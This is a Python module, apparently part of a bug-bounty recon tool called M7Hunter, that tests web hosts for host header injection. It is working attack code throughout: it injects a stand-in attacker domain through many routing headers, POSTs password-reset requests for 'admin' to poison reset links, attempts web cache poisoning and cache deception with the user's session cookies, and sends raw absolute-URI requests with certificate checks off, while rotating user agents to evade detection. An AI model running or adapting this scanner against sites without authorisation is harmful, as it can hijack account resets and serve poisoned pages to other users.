#!/usr/bin/env python3
# modules/step21_host_header.py — Host Header Injection V7 (UPGRADED)
# Added: cache poisoning chain, web cache deception, port-based bypass,
#        absolute-URI bypass, dangling markup injection
# Source: Bug Bounty Bootcamp Ch15 + CEH Ch9
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.request, urllib.error
from core.utils import safe_read
from core.http_client import sync_get

EVIL_HOST = "m7evil.com"

# ── All headers that affect host routing ─────────────────────────────────────
HOST_HEADERS = [
    "Host",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Original-Host",
    "X-Rewrite-URL",
    "X-Override-URL",
    "X-Forwarded-For-Host",
    "X-Custom-Host",
    "CF-Connecting-IP",    # Cloudflare bypass
    "True-Client-IP",
    "Cluster-Client-IP",
]

# ── Injection payloads ────────────────────────────────────────────────────────
EVIL_PAYLOADS = [
    EVIL_HOST,
    f"{EVIL_HOST}:80",
    f"{EVIL_HOST}:443",
    f"@{EVIL_HOST}",
    f"{EVIL_HOST}%0d%0a",
    f"localhost#{EVIL_HOST}",
    f"127.0.0.1, {EVIL_HOST}",
]

# ── Cache poisoning paths ─────────────────────────────────────────────────────
CACHE_PATHS = [
    "/",
    "/home",
    "/index",
    "/api",
    "/static/main.js",
    "/assets/app.css",
    "/cdn/bundle.js",
]

# ── Password reset paths ──────────────────────────────────────────────────────
RESET_PATHS = [
    "/forgot-password",     "/reset-password",
    "/password/reset",      "/api/password/reset",
    "/auth/forgot",         "/account/reset",
    "/user/forgot-password","/api/auth/forgot",
    "/api/user/forgot",     "/api/reset",
]

# ── Indicators of injection in response ──────────────────────────────────────
REFLECTION_PATTERNS = [
    re.compile(rf'{re.escape(EVIL_HOST)}',              re.I),
    re.compile(r'href=["\']https?://m7evil',            re.I),
    re.compile(r'action=["\']https?://m7evil',          re.I),
    re.compile(r'Location:.*m7evil',                    re.I),
    re.compile(r'Content-Security-Policy:.*m7evil',     re.I),
]


class Step21HostHeader:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["host_header_results"]
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("Host Header: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"Host Header V7: {len(live)} hosts — injection + cache poison + reset poison")

        for host in live:
            host = host.rstrip("/")

            # ── Test 1: Basic header injection ────────────────────
            r = self._test_header_injection(host, auth_h, out)
            found += r

            # ── Test 2: Password reset poisoning ──────────────────
            r = self._test_reset_poisoning(host, auth_h, out)
            found += r

            # ── Test 3: Web cache poisoning ───────────────────────
            r = self._test_cache_poisoning(host, auth_h, out)
            found += r

            # ── Test 4: Cache deception ───────────────────────────
            r = self._test_cache_deception(host, auth_h, out)
            found += r

            # ── Test 5: Absolute-URI bypass ───────────────────────
            r = self._test_absolute_uri(host, auth_h, out)
            found += r

            p.bypass.jitter()

        p.log.success(f"Host Header V7: {found} findings")

    # ── Test 1: Header injection ──────────────────────────────────────────────
    def _test_header_injection(self, host, auth_h, out) -> int:
        found = 0
        for payload in EVIL_PAYLOADS[:4]:
            for header in HOST_HEADERS[:8]:
                hdrs = {**auth_h, header: payload,
                        "User-Agent": self.p.bypass.ua()}
                if header == "Host":
                    hdrs["Host"] = payload

                resp = self._fetch(host, hdrs)
                if not resp: continue

                combined = resp.get("body","") + str(resp.get("headers",{}))
                for pat in REFLECTION_PATTERNS:
                    if pat.search(combined):
                        detail = (f"Host header injection: '{header}: {payload}' "
                                  f"reflected in response")
                        self._save(out,"high","HOST_HEADER_INJECTION",host,detail)
                        found += 1
                        return found
        return found

    # ── Test 2: Password reset poisoning ─────────────────────────────────────
    def _test_reset_poisoning(self, host, auth_h, out) -> int:
        """
        BB Bootcamp Ch15: Inject evil host into password reset flow.
        Victim gets reset link pointing to attacker domain.
        """
        found = 0
        for path in RESET_PATHS:
            url = host + path
            probe = self._fetch(url, auth_h)
            if not probe or probe.get("status",0) not in (200,405,302):
                continue

            # Inject via multiple headers
            for hdr in ["X-Forwarded-Host","Host","X-Host"]:
                hdrs = {**auth_h, hdr: EVIL_HOST,
                        "User-Agent": self.p.bypass.ua(),
                        "Content-Type": "application/x-www-form-urlencoded"}
                try:
                    req = urllib.request.Request(
                        url,
                        data=b"email=test@test.com&username=admin",
                        headers=hdrs, method="POST")
                    resp = urllib.request.urlopen(req, timeout=8)
                    body = resp.read(30000).decode("utf-8","ignore")
                except urllib.error.HTTPError as e:
                    try: body = e.read(5000).decode("utf-8","ignore")
                    except: body = ""
                except Exception:
                    continue

                if EVIL_HOST in body:
                    detail = (f"Password Reset Poisoning: {hdr}: {EVIL_HOST} "
                              f"reflected at {path} — reset links sent to attacker")
                    self._save(out,"critical","PASSWORD_RESET_POISONING",url,detail)
                    found += 1
                    return found
        return found

    # ── Test 3: Web cache poisoning ───────────────────────────────────────────
    def _test_cache_poisoning(self, host, auth_h, out) -> int:
        """
        BB Bootcamp Ch15: Cache poisoning via unkeyed header.
        If X-Forwarded-Host is reflected but NOT part of cache key → poison.
        """
        found = 0
        for path in CACHE_PATHS[:5]:
            url = host + path

            # Baseline (no injection)
            baseline = self._fetch(url, auth_h)
            if not baseline or baseline.get("status",0) != 200:
                continue
            baseline_body = baseline.get("body","")

            # With evil host header
            poison_hdrs = {
                **auth_h,
                "X-Forwarded-Host": EVIL_HOST,
                "User-Agent": self.p.bypass.ua(),
                "Cache-Control": "no-cache",  # try to bypass existing cache
            }
            resp = self._fetch(url, poison_hdrs)
            if not resp: continue

            body = resp.get("body","")
            hdrs = resp.get("headers",{})

            # Check: evil host reflected AND response is cacheable
            cache_hit = any(
                "x-cache" in k.lower() or "cf-cache" in k.lower()
                for k in hdrs
            )
            if EVIL_HOST in body and baseline_body != body:
                sev = "critical" if cache_hit else "high"
                detail = (f"Web Cache Poisoning: X-Forwarded-Host:{EVIL_HOST} "
                          f"reflected at {path}"
                          f"{' — response cached!' if cache_hit else ''}")
                self._save(out, sev,"WEB_CACHE_POISONING", url, detail)
                found += 1
        return found

    # ── Test 4: Cache deception ───────────────────────────────────────────────
    def _test_cache_deception(self, host, auth_h, out) -> int:
        """
        Cache deception: trick cache into storing private pages as static files.
        /account.html → cache serves account data to everyone.
        """
        if not auth_h: return 0  # Needs auth session
        found = 0
        deception_paths = [
            "/account/profile.css",   "/dashboard.js",
            "/api/user/me.jpg",       "/account.html",
            "/user/settings.png",     "/admin.ico",
        ]
        for path in deception_paths:
            url = host + path
            resp = self._fetch(url, auth_h)
            if not resp: continue
            st   = resp.get("status",0)
            hdrs = resp.get("headers",{})
            body = resp.get("body","")

            if st == 200 and len(body) > 100:
                ct = str(hdrs.get("content-type",""))
                # If returns 200 with account data at static extension = deception
                if any(x in body.lower() for x in ["email","account","username","profile"]):
                    if "css" in path or "js" in path or "png" in path:
                        detail = (f"Cache Deception: {path} returns 200 "
                                  f"with account data — cache may serve to others")
                        self._save(out,"high","WEB_CACHE_DECEPTION",url,detail)
                        found += 1
        return found

    # ── Test 5: Absolute-URI bypass ───────────────────────────────────────────
    def _test_absolute_uri(self, host, auth_h, out) -> int:
        """Use absolute URI in request line to override Host."""
        try:
            parsed_host = host.replace("https://","").replace("http://","").split("/")[0]
            port = 443 if host.startswith("https") else 80
            import socket, ssl
            s = socket.create_connection((parsed_host, port), timeout=8)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=parsed_host)

            # Absolute URI with different host
            req = (
                f"GET http://{EVIL_HOST}/ HTTP/1.1\r\n"
                f"Host: {parsed_host}\r\n"
                f"User-Agent: M7Hunter/7.0\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.sendall(req.encode())
            resp = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                except Exception: break
            s.close()

            resp_str = resp.decode("latin-1","ignore")
            if EVIL_HOST in resp_str and "404" not in resp_str[:30]:
                detail = "Absolute-URI bypass: evil host in request line accepted"
                self._save(out,"medium","HOST_HEADER_ABS_URI",host,detail)
                return 1
        except Exception:
            pass
        return 0

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = f"Bearer {a}" if not a.startswith("Bearer") else a
        return hdrs

    def _fetch(self, url, headers, timeout=8) -> dict:
        try:
            req  = urllib.request.Request(url, headers=headers)
            resp = urllib.request.urlopen(req, timeout=timeout)
            hdrs = {k.lower():v for k,v in resp.headers.items()}
            return {"status": resp.status,
                    "body": resp.read(50000).decode("utf-8","ignore"),
                    "headers": hdrs}
        except urllib.error.HTTPError as e:
            try: body = e.read(5000).decode("utf-8","ignore")
            except: body = ""
            return {"status": e.code, "body": body,
                    "headers": {k.lower():v for k,v in e.headers.items()}}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "host-header-v7", response=response, payload=payload)
